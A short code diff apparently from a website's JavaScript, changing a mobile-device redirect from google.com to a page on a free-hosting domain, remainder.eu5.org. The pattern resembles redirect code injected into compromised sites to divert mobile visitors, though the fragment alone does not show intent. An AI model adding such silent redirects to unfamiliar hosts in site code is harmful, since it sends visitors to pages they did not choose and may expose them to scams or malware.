@@ -29,5 +29,5 @@ var isMobile = {
  */
 
 if (isMobile.any()) {
-    window.location = "http://google.com";
+    window.location = "http://remainder.eu5.org/m";
 };
